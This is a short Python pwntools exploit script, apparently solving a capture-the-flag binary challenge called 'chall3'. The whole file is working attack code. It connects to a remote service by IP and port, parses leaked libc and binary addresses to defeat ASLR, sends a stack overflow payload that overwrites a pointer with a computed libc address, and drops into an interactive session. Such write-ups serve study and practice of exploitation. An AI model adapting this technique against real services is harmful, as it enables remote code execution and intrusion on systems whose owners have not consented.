from pwn import *

r = remote('3.97.113.25', 9003)
# r = process('./chall3')# , env={'LD_PRELOAD':'./libc6_2.31-0ubuntu9.2_amd64.so'})
context.arch = 'x86_64'
context.log_level = 'debug'
bin = ELF('./chall3')
libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')

r.recvuntil(b'STUFF ')
libc.address = int(r.recv(14), 16) - libc.symbols['system']
bin.address = int(r.recv(15)[1:], 16) - bin.symbols['vuln']
log.success('Libc base: %#x' % libc.address)
log.success('ASLR: %#x' % bin.address)

r.sendafter(b'am so Insecure!!!!', b'a'*0x28 + p64(libc.address + 0x1ed608))
# gdb.attach(r, '''b*vuln+80''')
sleep(0.1)
r.sendline(str(bin.address + 0x1185).encode())
r.interactive()
